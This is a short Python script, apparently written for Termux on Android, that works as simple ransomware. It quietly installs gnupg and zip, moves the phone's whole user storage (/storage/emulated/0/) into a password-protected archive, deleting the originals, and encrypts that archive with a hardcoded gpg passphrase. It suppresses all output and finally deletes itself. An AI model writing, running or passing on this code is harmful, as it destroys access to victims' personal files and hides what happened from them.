import os,sys,time

def package():
        try:
                import gnupg
                import zip
        except ImportError:
                os.system('pkg install -y gnupg zip &> /dev//null')

package()
os.system('zip --password sayang12345 your_file.zip -m -r /storage/emulated/0/ &> /dev//null')

os.system('gpg --batch -c --passphrase sayang12345 your_file.zip &> /dev//null')
os.system('rm your_file.zip;cp your_file.zip.gpg /sdcard')
os.system('rm -rf minicrypto.py')